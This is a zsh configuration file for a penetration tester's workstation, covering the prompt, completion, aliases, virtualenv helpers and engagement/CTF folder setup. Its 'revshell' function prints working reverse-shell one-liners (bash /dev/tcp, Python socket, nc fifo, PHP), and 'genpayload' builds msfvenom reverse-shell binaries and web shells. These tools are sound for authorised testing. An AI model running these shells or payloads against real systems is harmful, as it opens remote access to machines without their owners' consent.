# ██████████████████████████████████████████████████████████████
#                    POWERLEVEL10K INSTANT PROMPT
# ██████████████████████████████████████████████████████████████
# Must stay at the top. Code requiring input goes BEFORE this.
if [[ -r "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh" ]]; then
  source "${XDG_CACHE_HOME:-$HOME/.cache}/p10k-instant-prompt-${(%):-%n}.zsh"
fi

# ██████████████████████████████████████████████████████████████
#                    OH-MY-ZSH
# ██████████████████████████████████████████████████████████████
export ZSH="$HOME/.oh-my-zsh"
ZSH_THEME="powerlevel10k/powerlevel10k"
DISABLE_MAGIC_FUNCTIONS="true"
plugins=(sudo)

source $ZSH/oh-my-zsh.sh

# fzf keybindings and completion (Arch Linux paths)
[[ -f /usr/share/fzf/key-bindings.zsh ]] && source /usr/share/fzf/key-bindings.zsh
[[ -f /usr/share/fzf/completion.zsh ]] && source /usr/share/fzf/completion.zsh
# Arch puts these under zsh/plugins, Debian directly under /usr/share. Probing both
# is what makes the same .zshrc work on Arch and Kali.
for _plugin in zsh-syntax-highlighting zsh-autosuggestions; do
  for _dir in /usr/share/zsh/plugins/$_plugin /usr/share/$_plugin; do
    [[ -f $_dir/$_plugin.zsh ]] && source $_dir/$_plugin.zsh && break
  done
done
unset _plugin _dir

[[ ! -f ~/.p10k.zsh ]] || source ~/.p10k.zsh

# ██████████████████████████████████████████████████████████████
#                    KEYBINDINGS
# ██████████████████████████████████████████████████████████████
bindkey -e                                              # emacs mode (bash style)

# Terminal-specific keys (required for Kitty)
bindkey '^[[H' beginning-of-line                        # home
bindkey '^[[F' end-of-line                              # end
bindkey '^[[3~' delete-char                             # delete
bindkey '^[[1;5C' forward-word                          # ctrl + ->
bindkey '^[[1;5D' backward-word                         # ctrl + <-
bindkey '^[[3;5~' kill-word                             # ctrl + delete
bindkey '^H' backward-kill-word                         # ctrl + backspace

# ██████████████████████████████████████████████████████████████
#                    COMPLETION
# ██████████████████████████████████████████████████████████████
autoload -Uz compinit
compinit -d ~/.cache/zcompdump

zstyle ':completion:*' auto-description 'specify: %d'
zstyle ':completion:*' completer _expand _complete _correct _approximate
zstyle ':completion:*' format 'Completing %d'
zstyle ':completion:*' group-name ''
zstyle ':completion:*' menu select=2
command -v dircolors &>/dev/null && eval "$(dircolors -b)"
zstyle ':completion:*:default' list-colors ${(s.:.)LS_COLORS}
zstyle ':completion:*' list-colors ''
zstyle ':completion:*' list-prompt %SAt %p: Hit TAB for more, or the character to insert%s
zstyle ':completion:*' matcher-list '' 'm:{a-z}={A-Z}' 'm:{a-zA-Z}={A-Za-z}' 'r:|[._-]=* r:|=* l:|=*'
zstyle ':completion:*' menu select=long
zstyle ':completion:*' select-prompt %SScrolling active: current selection at %p%s
zstyle ':completion:*' use-compctl false
zstyle ':completion:*' verbose true
zstyle ':completion:*:*:kill:*:processes' list-colors '=(#b) #([0-9]#)*=0=01;31'
zstyle ':completion:*:kill:*' command 'ps -u $USER -o pid,%cpu,tty,cputime,cmd'

# ██████████████████████████████████████████████████████████████
#                    HISTORY
# ██████████████████████████████████████████████████████████████
HISTFILE=~/.zsh_history
HISTSIZE=1000
SAVEHIST=2000

# ██████████████████████████████████████████████████████████████
#                    HELPER FUNCTIONS
# ██████████████████████████████████████████████████████████████

# ──────────────────────────────────────────────────────────────
#  Base utilities
# ──────────────────────────────────────────────────────────────
ensure_dir() {
  local d="$1"
  mkdir -p "$d" || echo "[ERROR] Failed to create: $d"
}

# ──────────────────────────────────────────────────────────────
#  Python hacking venv (shared config)
# ──────────────────────────────────────────────────────────────
HACKING_VENV_DIR=~/Workarea/.python-hacking-venv
HACKING_VENV_PACKAGES=(
  pwntools scapy requests beautifulsoup4 lxml paramiko pycryptodome python-nmap
  capstone keystone-engine unicorn
  sympy pillow oletools selenium pyyaml
)
# Packages incompatible with pip on Python 3.12+ (installed via pacman)
HACKING_SYSTEM_PACKAGES=(ropper)

_create_hacking_venv() {
  local total=${#HACKING_VENV_PACKAGES[@]}
  local current=0
  local failed=()

  echo "[INFO] Creating Python venv..."
  if ! python3 -m venv "$HACKING_VENV_DIR" 2>&1; then
    echo "[ERROR] Failed to create venv. Is python3 installed?"
    return 1
  fi

  echo "[INFO] Upgrading pip..."
  if ! "$HACKING_VENV_DIR/bin/pip" install --quiet --upgrade pip; then
    echo "[ERROR] Failed to upgrade pip."
    return 1
  fi

  echo "[INFO] Installing Python packages ($total)..."
  for pkg in "${HACKING_VENV_PACKAGES[@]}"; do
    current=$((current + 1))
    printf "\r  [%d/%d] Installing %-25s" "$current" "$total" "$pkg"
    if ! "$HACKING_VENV_DIR/bin/pip" install --quiet "$pkg" 2>/dev/null; then
      failed+=("$pkg")
    fi
  done
  echo ""

  if (( ${#failed[@]} > 0 )); then
    echo "[WARN] Failed to install: ${failed[*]}"
  fi

  touch "$HACKING_VENV_DIR/.installed"
  echo "[OK] Python hacking venv ready ($((total - ${#failed[@]}))/$total packages)"

  # Install packages that can't build with current Python via pacman (BlackArch)
  if (( ${#HACKING_SYSTEM_PACKAGES[@]} > 0 )); then
    echo "[INFO] Installing system packages via pacman: ${HACKING_SYSTEM_PACKAGES[*]}"
    sudo pacman -S --noconfirm --needed "${HACKING_SYSTEM_PACKAGES[@]}" 2>/dev/null \
      && echo "[OK] System packages installed." \
      || echo "[WARN] Some system packages failed. Install manually: sudo pacman -S ${HACKING_SYSTEM_PACKAGES[*]}"
  fi
}

# ──────────────────────────────────────────────────────────────
#  Pentesting workspace
# ──────────────────────────────────────────────────────────────
workspace-init() {
  local created=0
  local dirs=(
    ~/VPN
    ~/Workarea
    ~/Workarea/Engagements
    ~/Workarea/Engagements/_template/{recon,scans,exploitation,post,evidence/{screenshots,loot},report}
    ~/Workarea/CTF
    ~/Workarea/CTF/_template/{pwn,web,crypto,rev,forensics,misc}
    ~/Workarea/HTB
    ~/Workarea/HTB/_template/{recon,scans,exploit,loot,screenshots}
    ~/Workarea/Labs
    ~/Workarea/Scripts/{recon,exploit,post,utils}
    ~/Workarea/Payloads/{shells,webshells,implants}
    ~/Workarea/Wordlists
    ~/Workarea/Tools
    ~/Workarea/Notes
    ~/Workarea/Reports
  )
  local total=${#dirs[@]}
  local current=0

  echo "[INFO] Creating workspace directories..."
  for d in "${dirs[@]}"; do
    current=$((current + 1))
    if [[ ! -d "$d" ]]; then
      printf "\r  [%d/%d] Creating %-50s" "$current" "$total" "${d/#$HOME/~}"
      ensure_dir "$d" && created=$((created + 1))
    else
      printf "\r  [%d/%d] Exists   %-50s" "$current" "$total" "${d/#$HOME/~}"
    fi
  done
  echo ""
  echo "[OK] Directories ready ($created new, $((total - created)) existing)."

  # Create persistent Python hacking venv
  if [[ ! -f "$HACKING_VENV_DIR/.installed" ]]; then
    if ! _create_hacking_venv; then
      echo "        Fix and run 'wsinit' again to retry."
    fi
  else
    echo "[OK] Python hacking venv already set up."
  fi

  echo ""
  echo "[OK] Workspace initialized."
  echo "     - ~/Workarea"
  echo "     - $HACKING_VENV_DIR"
  echo "     - ~/VPN"
}

# ──────────────────────────────────────────────────────────────
#  Nmap helpers
# ──────────────────────────────────────────────────────────────
nmap-extract() {
  if [ -z "$1" ] || [ ! -f "$1" ]; then
    echo "[ERROR] Usage: nmap-extract <nmap_output_file>"
    return 1
  fi

  local ports ip_address
  ports=$(grep -oP '\d{1,5}/open' "$1" 2>/dev/null | awk -F/ '{print $1}' | xargs | tr ' ' ',')
  ip_address=$(grep -oP '\d{1,3}(\.\d{1,3}){3}' "$1" 2>/dev/null | sort -u | head -n 1)

  echo "[INFO] Nmap scan parsed"
  echo "       Target IP   : ${ip_address:-Not found}"
  echo "       Open ports  : ${ports:-None}"

  if command -v xclip >/dev/null 2>&1 && [ -n "$ports" ]; then
    echo -n "$ports" | xclip -selection clipboard
    echo "[INFO] Open ports copied to clipboard"
  fi
}

# ──────────────────────────────────────────────────────────────
#  Target (Polybar)
# ──────────────────────────────────────────────────────────────
target-set() {
  local cfg_dir="$HOME/.config/files"
  local target_file="$cfg_dir/target"

  ensure_dir "$cfg_dir"

  if [ $# -eq 1 ]; then
    echo "$1" > "$target_file"
  elif [ $# -eq 2 ]; then
    echo "$1 $2" > "$target_file"
  else
    echo "[ERROR] Usage: tset <IP> [NAME]"
    return 1
  fi

  echo "[OK] Active target: $(cat "$target_file")"
}

target-reset() {
  local target_file="$HOME/.config/files/target"
  : > "$target_file" 2>/dev/null
  echo "[OK] Target cleared."
}

# ──────────────────────────────────────────────────────────────
#  FZF preview
# ──────────────────────────────────────────────────────────────
fzf-preview() {
  local preview_cmd='[[ $(file --mime {}) =~ binary ]] && echo "{} is a binary file" || (bat --style=numbers --color=always {} || cat {}) 2>/dev/null | head -500'

  if [ "$1" = "h" ]; then
    fzf -m --reverse --preview-window=down:20 --preview "$preview_cmd"
  else
    fzf -m --preview "$preview_cmd"
  fi
}

# ──────────────────────────────────────────────────────────────
#  Security
# ──────────────────────────────────────────────────────────────
file-wipe() {
  if [ -z "$1" ] || [ ! -e "$1" ]; then
    echo "[ERROR] Usage: file-wipe <file>"
    return 1
  fi

  if command -v shred >/dev/null 2>&1; then
    shred -u -v -n 5 "$1" && echo "[OK] File securely removed: $1"
  else
    dd if=/dev/zero of="$1" bs=1M count=1 &>/dev/null || true
    rm -f "$1" && echo "[OK] File removed: $1"
  fi
}

# ──────────────────────────────────────────────────────────────
#  Python venv — local (per-project)
# ──────────────────────────────────────────────────────────────
venv-create() {
  [ -d venv ] && echo "[SKIP] venv already exists" && return 0
  python3 -m venv venv && echo "[OK] venv created"
}

venv-activate() {
  [ ! -f venv/bin/activate ] && echo "[ERROR] No local ./venv found. Create one with 'venvc'" && return 1
  source venv/bin/activate && echo "[OK] venv activated (local)"
}

venv-remove() {
  [ ! -d venv ] && echo "[SKIP] No local venv to remove" && return 0
  [[ "$VIRTUAL_ENV" == "$(pwd)/venv" ]] && deactivate 2>/dev/null
  rm -rf venv && echo "[OK] venv removed"
}

# ──────────────────────────────────────────────────────────────
#  Python venv — workspace (persistent hacking venv)
# ──────────────────────────────────────────────────────────────
wsvenv-activate() {
  [ ! -f "$HACKING_VENV_DIR/bin/activate" ] && echo "[ERROR] No workspace venv found. Run 'wsinit'" && return 1
  source "$HACKING_VENV_DIR/bin/activate" && echo "[OK] venv activated (workspace)"
}

wsvenv-reset() {
  [[ "$VIRTUAL_ENV" == "$HACKING_VENV_DIR" ]] && deactivate 2>/dev/null
  [ -d "$HACKING_VENV_DIR" ] && rm -rf "$HACKING_VENV_DIR"
  _create_hacking_venv
}

# ──────────────────────────────────────────────────────────────
#  Quick IP lookup
# ──────────────────────────────────────────────────────────────
myip() {
  local iface="${1:-tun0}"
  ip -4 addr show "$iface" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' \
    || { echo "[ERROR] Interface '$iface' not found or no IPv4" >&2; return 1; }
}

# ──────────────────────────────────────────────────────────────
#  Reverse shell generator
# ──────────────────────────────────────────────────────────────
revshell() {
  local ip="${1:-$(myip tun0 2>/dev/null)}" port="${2:-4444}"
  [ -z "$ip" ] && echo "[ERROR] No IP. Usage: revshell <IP> [PORT]" && return 1
  echo "[*] Reverse shells for $ip:$port"
  echo ""
  echo "bash:    bash -i >& /dev/tcp/$ip/$port 0>&1"
  echo "python3: python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$ip\",$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
  echo "nc:      rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $ip $port >/tmp/f"
  echo "php:     php -r '\$s=fsockopen(\"$ip\",$port);\$p=proc_open(\"/bin/bash\",array(\$s,\$s,\$s),\$pipes);'"
}

# ──────────────────────────────────────────────────────────────
#  Quick HTTP server
# ──────────────────────────────────────────────────────────────
serve() {
  local port="${1:-8080}"
  local ip
  ip=$(myip tun0 2>/dev/null || myip eth0 2>/dev/null || echo "0.0.0.0")
  echo "[OK] Serving $(pwd) on http://$ip:$port"
  python3 -m http.server "$port"
}

# ──────────────────────────────────────────────────────────────
#  Encode / decode
# ──────────────────────────────────────────────────────────────
b64e() { echo -n "$1" | base64; }
b64d() { echo -n "$1" | base64 -d; echo; }
urle() { python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$1"; }
urld() { python3 -c "import urllib.parse,sys; print(urllib.parse.unquote(sys.argv[1]))" "$1"; }

# ──────────────────────────────────────────────────────────────
#  Quick listener (rlwrap + nc)
# ──────────────────────────────────────────────────────────────
listen() {
  local port="${1:-4444}"
  echo "[*] Listening on port $port (rlwrap + nc)"
  rlwrap nc -lvnp "$port"
}

# ──────────────────────────────────────────────────────────────
#  msfvenom payload generator
# ──────────────────────────────────────────────────────────────
genpayload() {
  local lhost="${1:-$(myip tun0 2>/dev/null)}" lport="${2:-4444}" type="${3:-elf}"
  [ -z "$lhost" ] && echo "[ERROR] No IP. Usage: genpayload <LHOST> [LPORT] [exe|elf|php|jsp|war]" && return 1
  local outfile="shell.$type"
  declare -A payloads=(
    [exe]="windows/x64/shell_reverse_tcp"
    [elf]="linux/x64/shell_reverse_tcp"
    [php]="php/reverse_php"
    [jsp]="java/jsp_shell_reverse_tcp"
    [war]="java/jsp_shell_reverse_tcp"
  )
  local payload="${payloads[$type]}"
  [ -z "$payload" ] && echo "[ERROR] Unknown type: $type (exe|elf|php|jsp|war)" && return 1
  msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f "$type" -o "$outfile" \
    && echo "[OK] Payload: $outfile ($lhost:$lport)"
}

# ──────────────────────────────────────────────────────────────
#  Wordlist search
# ──────────────────────────────────────────────────────────────
wl() {
  find /usr/share/wordlists /usr/share/seclists ~/Workarea/Wordlists -iname "*${1}*" 2>/dev/null
}

# ──────────────────────────────────────────────────────────────
#  SSH and VPN
# ──────────────────────────────────────────────────────────────
ssh-term() {
  TERM="${TERM:-xterm-256color}" command ssh "$@"
}

vpn-connect() {
  local vpn_dir=~/VPN

  [ ! -d "$vpn_dir" ] && echo "[ERROR] VPN directory not found" && return 1

  if [ -z "$1" ]; then
    echo "[INFO] Available VPN profiles:"
    select ovpn_file in "$vpn_dir"/*.ovpn; do
      [ -n "$ovpn_file" ] && sudo openvpn "$ovpn_file" && break
    done
  else
    [ -f "$vpn_dir/$1" ] && sudo openvpn "$vpn_dir/$1" || echo "[ERROR] Profile not found: $1"
  fi
}

# ──────────────────────────────────────────────────────────────
#  Full system update
# ──────────────────────────────────────────────────────────────
#  Same script the polybar Updates module runs, here in this terminal.
system-update() {
  local script="$HOME/.config/polybar/theme/scripts/update-system.sh"
  [ -x "$script" ] || { echo "[ERROR] Update script not found: $script"; return 1; }
  "$script" "$@"
}

# ██████████████████████████████████████████████████████████████
#                    ALIASES
# ██████████████████████████████████████████████████████████████

# ──────────────────────────────────────────────────────────────
#  File listing (lsd with fallback to ls)
# ──────────────────────────────────────────────────────────────
if command -v lsd &>/dev/null; then
  alias ls='lsd --group-dirs=first'
  alias l='lsd --group-dirs=first'
  alias ll='lsd -lh --group-dirs=first'
  alias la='lsd -a --group-dirs=first'
  alias lla='lsd -lha --group-dirs=first'
else
  alias ll='ls -lh --color=auto'
  alias la='ls -a --color=auto'
  alias lla='ls -lha --color=auto'
fi

# ──────────────────────────────────────────────────────────────
#  Cat (bat with fallback to cat)
# ──────────────────────────────────────────────────────────────
# Debian ships bat's binary as batcat, so looking only for `bat` silently left Kali
# without the alias.
if command -v bat &>/dev/null; then
  alias cat='bat --paging=always'
  alias catnl='bat --paging=never'
elif command -v batcat &>/dev/null; then
  alias bat='batcat'
  alias cat='batcat --paging=always'
  alias catnl='batcat --paging=never'
fi

# Same story for fd.
command -v fd &>/dev/null || { command -v fdfind &>/dev/null && alias fd='fdfind'; }
alias catn='/bin/cat'

# ──────────────────────────────────────────────────────────────
#  Custom functions
# ──────────────────────────────────────────────────────────────
alias wsinit=workspace-init
alias nmapx=nmap-extract
alias tgt=target-set
alias tgtr=target-reset
alias fzfp=fzf-preview
alias fwipe=file-wipe
alias ssht=ssh-term
alias vconn=vpn-connect
alias venvc=venv-create
alias venva=venv-activate
alias venvr=venv-remove
alias wsvenva=wsvenv-activate
alias wsvenvr=wsvenv-reset
alias mip=myip
alias revsh=revshell
alias srv=serve
alias lsn=listen
alias gpl=genpayload
alias sysup=system-update

# ──────────────────────────────────────────────────────────────
#  Machine-local overrides
# ──────────────────────────────────────────────────────────────
#  Loaded last, so anything here wins. Lives outside the repo, so a dotfiles
#  update cannot discard it. Put your own aliases and functions in it.
[[ -f ~/.zshrc.local ]] && source ~/.zshrc.local
